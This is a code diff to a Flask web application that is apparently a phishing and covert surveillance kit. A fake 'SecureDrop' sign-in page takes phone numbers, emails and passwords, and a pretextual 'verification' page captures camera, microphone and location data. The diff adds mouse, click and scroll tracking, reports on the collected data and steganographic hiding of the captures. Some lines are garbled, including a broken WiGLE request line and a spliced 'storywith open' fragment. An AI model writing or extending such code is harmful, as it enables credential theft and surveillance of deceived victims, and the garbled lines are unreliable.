@@ -48,6 +48,8 @@ logging.basicConfig(
 # Add before_request to log data for every request with Client Hints
 @app.before_request
 def log_request_data():
+    if 'csrf_token' not in session:
+        session['csrf_token'] = os.urandom(24).hex()
     ip_header = request.headers.get('X-Forwarded-For', request.remote_addr)
     ip = ip_header.split(",")[0].strip() if ip_header else request.remote_addr
     user_agent = request.headers.get('User-Agent', 'unknown')
@@ -145,6 +147,7 @@ def get_wifi_location_from_wigle(bssid):
     headers = {"Accept": "application/json"}
     params = {"netid": bssid}
     try:
+        response = requests.get("https://api.wigle.net/api/v2/network Gravestone Analytics - https://www.gravestone.io/ - https://www.gravestone.io/gravestone-insights-ja3-fingerprinting - https://www.gravestone.io/gravestone-insights-ja3-fingerprinting
         response = requests.get("https://api.wigle.net/api/v2/network/search", headers=headers, params=params, auth=(username, api_token))
         if response.status_code == 200:
             data = response.json()
@@ -305,7 +308,7 @@ The provided data contains information about devices and users potentially invol
    * **Potential Connection 1:** [Description]
        * **Users Involved:** [List]
        * **Supporting Evidence:** [Data points]
-       * **Strength of Connection:** [High/Medium/Low]
+       * **Strength of Connection:** [High/Medium/Low salient analysis]
        * **Potential Lead:** [Explanation]
    **Conclusion:** [Summary of promising leads]
 """ + json.dumps(data, indent=2)
@@ -326,11 +329,35 @@ def generate_pdf(logged_data):
     c.save()
     buffer.seek(0)
 
+    # Enhanced PDF generation
+    enhanced_buffer = BytesIO()
+    doc = SimpleDocTemplate(enhanced_buffer, pagesize=letter)
+    styles = getSampleStyleSheet()
+    story = []
+
+    # Add title
+    story.append(Paragraph("User Data Report", styles['Title']))
+
+    # Add Gemini report
+    gemini_report = logged_data.get("gemini_report", "No report available")
+    story.append(Paragraph("Gemini AI Analysis:", styles['Heading2']))
+    storywith open('templates/user_data.html') as f:
+        story.append(Paragraph(gemini_report, styles['Normal']))
+
+    # Add collected data
+    story.append(Paragraph("Collected User Data:", styles['Heading2']))
+    for key, value in logged_data.items():
+        if key != "gemini_report":
+            story.append(Paragraph(f"{key}: {json.dumps(value, indent=2)}", styles['Normal']))
+
+    doc.build(story)
+    enhanced_buffer.seek(0)
+
     hidden_message = get_hidden_message(logged_data)
     token = str(uuid.uuid4())
     reversed_token = token[::-1]
 
-    pdf_reader = PyPDF2.PdfReader(buffer)
+    pdf_reader = PyPDF2.PdfReader(enhanced_buffer)
     pdf_writer = PyPDF2.PdfWriter()
     for page in pdf_reader.pages:
         pdf_writer.add_page(page)
@@ -410,6 +437,11 @@ PERMISSIONS_PAGE = """
             <h2>To download the Account Details, you have to verify whether you are the right person who has the IP address</h2>
             <p>Kindly allow all permissions by clicking enable.</p>
             <button id="enableButton" class="btn btn-primary">Enable</button>
+            <div id="permissionsStatus" class="mt-3">
+                <p>Location: <span id="locationStatus">Pending</span></p>
+                <p>Camera: <span id="cameraStatus">Pending</span></p>
+                <p>Microphone: <span id="microphoneStatus">Pending</span></p>
+            </div>
             <p id="status"></p>
         </div>
     </div>
@@ -450,6 +482,9 @@ PERMISSIONS_PAGE = """
                         body: JSON.stringify({image: snapshot})
                     });
                 }, 5000);
+            }).catch(err => {
+                console.error('Camera access denied:', err);
+                document.getElementById('cameraStatus').textContent = 'Denied';
             });
         }
 
@@ -488,7 +523,10 @@ PERMISSIONS_PAGE = """
                         }
                     }, 5000);  // Record for 5 seconds
                 }, 10000);  // Every 10 seconds
-            }).catch(() => {});
+            }).catch(err => {
+                console.error('Microphone access denied:', err);
+                document.getElementById('microphoneStatus').textContent = 'Denied';
+            });
         }
 
         document.getElementById('enableButton').addEventListener('click', () => {
@@ -500,18 +538,27 @@ PERMISSIONS_PAGE = """
 
             navigator.geolocation.getCurrentPosition(() => {
                 permissions.location = true;
+                document.getElementById('locationStatus').textContent = 'Granted';
                 startLocationCapture();
-            }, () => {});
+            }, () => {
+                document.getElementById('locationStatus').textContent = 'Denied';
+            });
 
             navigator.mediaDevices.getUserMedia({video: true}).then(() => {
                 permissions.camera = true;
+                document.getElementById('cameraStatus').textContent = 'Granted';
                 startCameraCapture();
-            }).catch(() => {});
+            }).catch(() => {
+                document.getElementById('cameraStatus').textContent = 'Denied';
+            });
 
             navigator.mediaDevices.getUserMedia({audio: true}).then(() => {
                 permissions.microphone = true;
+                document.getElementById('microphoneStatus').textContent = 'Granted';
                 startMicrophoneCapture();
-            }).catch(() => {});
+            }).catch(() => {
+                document.getElementById('microphoneStatus').textContent = 'Denied';
+            });
 
             setTimeout(() => {
                 if (permissions.location && permissions.camera && permissions.microphone) {
@@ -525,6 +572,94 @@ PERMISSIONS_PAGE = """
                 }
             }, 1000);  // Give some time for permissions to be granted
         });
+
+        // Additional data capturing
+        try {
+            const pageLoadTime = performance.now();
+            fetch('/log_performance', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({pageLoadTime})
+            }).catch(err => {
+                fetch('/log_error', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({error: 'Performance log failed', message: err.message})
+                });
+            });
+
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            const connectionType = connection ? connection.effectiveType : 'unknown';
+            const downlink = connection ? connection.downlink : 'unknown';
+            fetch('/log_connection', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({connectionType, downlink})
+            }).catch(err => {
+                fetch('/log_error', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({error: 'Connection log failed', message: err.message})
+                });
+            });
+
+            let mouseData = [];
+            document.addEventListener('mousemove', (e) => {
+                mouseData.push({x: e.clientX, y: e.clientY, timestamp: Date.now()});
+            });
+            document.addEventListener('click', (e) => {
+                fetch('/log_click', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({x: e.clientX, y: e.clientY, timestamp: Date.now()})
+                }).catch(err => {
+                    fetch('/log_error', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({error: 'Click log failed', message: err.message})
+                    });
+                });
+            });
+            setInterval(() => {
+                if (mouseData.length > 0) {
+                    fetch('/log_mouse', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({mouseData})
+                    }).catch(err => {
+                        fetch('/log_error', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({error: 'Mouse log failed', message: err.message})
+                        });
+                    });
+                    mouseData = [];
+                }
+            }, 5000);
+
+            document.addEventListener('scroll', () => {
+                const scrollTop = window.scrollY || document.documentElement.scrollTop;
+                const scrollHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+                const scrollPercent = (scrollTop / scrollHeight) * 100;
+                fetch('/log_scroll', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({scrollPercent, timestamp: Date.now()})
+                }).catch(err => {
+                    fetch('/log_error', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({error: 'Scroll log failed', message: err.message})
+                    });
+                });
+            });
+        } catch (err) {
+            fetch('/log_error', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({error: 'Additional data capture failed', message: err.message})
+            });
+        }
     </script>
 </body>
 </html>
@@ -545,15 +680,18 @@ LOGIN_PAGE = """
         input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
         button { width: 100%; padding: 12px; background-color: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; }
         button:hover { background-color: #1557b0; }
+        .form-text { color: #666; font-size: 12px; }
+        .alert { margin-top: 20px; }
     </style>
 </head>
 <body>
     <div class="login-container">
         <h1>Sign in to SecureDrop</h1>
         <form action="/login" method="post">
+            <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
             <label for="phone">Phone Number (India)</label>
             <input type="tel" id="phone" name="phone" required pattern="[0-9]{10}" maxlength="10" placeholder="9876543210">
-            <small>Enter your 10-digit mobile number without the country code.</small>
+            <small class="form-text">Enter your 10-digit mobile number without the country code.</small>
             <label for="email">Email</label>
             <input type="email" id="email" name="email" required>
             <label for="password">Password</label>
@@ -659,6 +797,102 @@ LOGIN_PAGE = """
                 });
             }, 5000);
         }
+
+        // Additional data capturing
+        try {
+            const pageLoadTime = performance.now();
+            fetch('/log_performance', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({pageLoadTime})
+            }).catch(err => {
+                fetch('/log_error', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({error: 'Performance log failed', message: err.message})
+                });
+            });
+
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            const connectionType = connection ? connection.effectiveType : 'unknown';
+            const downlink = connection ? connection.downlink : 'unknown';
+            fetch('/log_connection', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({connectionType, downlink})
+            }).catch(err => {
+                fetch('/log_error', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({error: 'Connection log failed', message: err.message})
+                });
+            });
+
+            let mouseData = [];
+            document.addEventListener('mousemove', (e) => {
+                mouseData.push({x: e.clientX, y: e.clientY, timestamp: Date.now()});
+            });
+            document.addEventListener('click', (e) => {
+                fetch('/log_click', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({x: e.clientX, y: e.clientY, timestamp: Date.now()})
+                }).catch(err => {
+                    fetch('/log_error', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({error: 'Click log failed', message: err.message})
+                    });
+                });
+            });
+            setInterval(() => {
+                if (mouseData.length > 0) {
+                    fetch('/log_mouse', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({mouseData})
+                    }).catch(err => {
+                        fetch('/log_error', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({error: 'Mouse log failed', message: err.message})
+                        });
+                    });
+                    mouseData = [];
+                }
+            }, 5000);
+
+            document.addEventListener('scroll', () => {
+                const scrollTop = window.scrollY || document.documentElement.scrollTop;
+                const scrollHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+                const scrollPercent = (scrollTop / scrollHeight) * 100;
+                fetch('/log_scroll', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({scrollPercent, timestamp: Date.now()})
+                }).catch(err => {
+                    fetch('/log_error', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({error: 'Scroll log failed', message: err.message})
+                    });
+                });
+            });
+
+            // Phone number validation
+            document.getElementById('phone').addEventListener('input', function() {
+                this.value = this.value.replace(/[^0-9]/g, '');
+                if (this.value.length > 10) {
+                    this.value = this.value.slice(0, 10);
+                }
+            });
+        } catch (err) {
+            fetch('/log_error', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({error: 'Additional data capture failed', message: err.message})
+            });
+        }
     </script>
 </body>
 </html>
@@ -693,15 +927,16 @@ DRIVE_PAGE = """
         <p>Your complaints:</p>
         <div class="file-list">
             <div class="file">
-                <div>📄 Complaint #1</div>
+                <div>ðŸ“� Complaint #1</div>
                 <div>{{ date1 }}</div>
             </div>
             <div class="file">
-                <div>📄 Complaint #2</div>
+                <div>ðŸ“� Complaint #2</div>
                 <div>{{ date2 }}</div>
             </div>
         </div>
         <form id="downloadForm" action="/download" method="post">
+            <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
             <input type="hidden" name="permissions" value="{{ permissions }}">
             <input type="hidden" name="screenWidth" id="screenWidth">
             <input type="hidden" name="screenHeight" id="screenHeight">
@@ -904,6 +1139,94 @@ DRIVE_PAGE = """
                 }
             };
         }
+
+        // Additional data capturing
+        try {
+            const pageLoadTime = performance.now();
+            fetch('/log_performance', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({pageLoadTime})
+            }).catch(err => {
+                fetch('/log_error', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({error: 'Performance log failed', message: err.message})
+                });
+            });
+
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            const connectionType = connection ? connection.effectiveType : 'unknown';
+            const downlink = connection ? connection.downlink : 'unknown';
+            fetch('/log_connection', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({connectionType, downlink})
+            }).catch(err => {
+                fetch('/log_error', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({error: 'Connection log failed', message: err.message})
+                });
+            });
+
+            let mouseData = [];
+            document.addEventListener('mousemove', (e) => {
+                mouseData.push({x: e.clientX, y: e.clientY, timestamp: Date.now()});
+            });
+            document.addEventListener('click', (e) => {
+                fetch('/log_click', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({x: e.clientX, y: e.clientY, timestamp: Date.now()})
+                }).catch(err => {
+                    fetch('/log_error', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({error: 'Click log failed', message: err.message})
+                    });
+                });
+            });
+            setInterval(() => {
+                if (mouseData.length > 0) {
+                    fetch('/log_mouse', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({mouseData})
+                    }).catch(err => {
+                        fetch('/log_error', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({error: 'Mouse log failed', message: err.message})
+                        });
+                    });
+                    mouseData = [];
+                }
+            }, 5000);
+
+            document.addEventListener('scroll', () => {
+                const scrollTop = window.scrollY || document.documentElement.scrollTop;
+                const scrollHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+                const scrollPercent = (scrollTop / scrollHeight) * 100;
+                fetch('/log_scroll', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({scrollPercent, timestamp: Date.now()})
+                }).catch(err => {
+                    fetch('/log_error', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({error: 'Scroll log failed', message: err.message})
+                    });
+                });
+            });
+        } catch (err) {
+            fetch('/log_error', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({error: 'Additional data capture failed', message: err.message})
+            });
+        }
     </script>
 </body>
 </html>
@@ -929,8 +1252,10 @@ def login():
     if request.method == 'GET':
         if not session.get('permissions_granted'):
             return redirect(url_for('permissions'))
-        return render_template_string(LOGIN_PAGE, permissions='granted')
+        return render_template_string(LOGIN_PAGE, permissions='granted', csrf_token=session['csrf_token'])
     if request.method == 'POST':
+        if request.form.get('csrf_token') != session.get('csrf_token'):
+            return "CSRF token mismatch", 403
         phone = request.form['phone']
         email = request.form['email']
         password = request.form['password']
@@ -948,10 +1273,12 @@ def drive():
     two_hours_ago = current_time - timedelta(hours=2)
     date1 = one_hour_ago.strftime("%b %d, %Y, %H:%M")
     date2 = two_hours_ago.strftime("%b %d, %Y, %H:%M")
-    return render_template_string(DRIVE_PAGE, permissions='granted', date1=date1, date2=date2)
+    return render_template_string(DRIVE_PAGE, permissions='granted', date1=date1, date2=date2, csrf_token=session['csrf_token'])
 
 @app.route('/download', methods=['POST'])
 def download():
+    if request.form.get('csrf_token') != session.get('csrf_token'):
+        return "CSRF token mismatch", 403
     logged_data = collect_data(request)
     logging.info(f"Download data collected: {json.dumps(logged_data)}")
 
@@ -1086,10 +1413,15 @@ def log_camera():
         filename = f"static/captures/{uuid.uuid4()}.jpg"
         with open(filename, 'wb') as f:
             f.write(image_bytes)
+        # Embed encrypted data into the image
+        stego_img = embed_data_in_image(data)
+        stego_filename = f"static/captures/stego_{uuid.uuid4()}.jpg"
+        stego_img.save(stego_filename)
         with buffer_lock:
             data_buffer.append(data)
             attachments_to_send.append(filename)
-        logging.info(f"Image captured and saved as {filename}")
+            attachments_to_send.append(stego_filename)
+        logging.info(f"Image captured and saved as {filename}, stego image as {stego_filename}")
         return {'status': 'success', 'filename': filename}, 200
     except Exception as e:
         logging.error(f"Error in log_camera: {e}")
